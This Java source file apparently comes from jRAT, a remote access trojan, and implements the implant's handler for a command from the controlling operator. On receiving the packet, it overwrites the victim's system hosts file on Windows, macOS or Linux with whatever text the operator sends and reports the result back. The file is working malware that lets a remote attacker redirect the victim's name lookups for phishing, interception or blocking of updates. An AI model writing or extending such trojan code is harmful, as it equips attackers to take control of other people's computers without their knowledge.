package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet39HostEditResult;
import java.io.File;
import java.io.FileWriter;

import oslib.OperatingSystem;

public class Packet56UpdateHostsFile extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String str = con.readLine();

		File file = null;

		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			file = new File(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");
		} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
			file = new File("/private/etc/hosts");
		} else {
			file = new File("/etc/hosts");
		}

		if (file != null) {
			try {
				FileWriter writer = new FileWriter(file);
				writer.write(str);
				writer.close();
				con.addToSendQueue(new Packet39HostEditResult(""));
			} catch (Exception ex) {
				con.addToSendQueue(new Packet39HostEditResult("ERR: " + ex.getMessage()));
			}
		}
	}

}
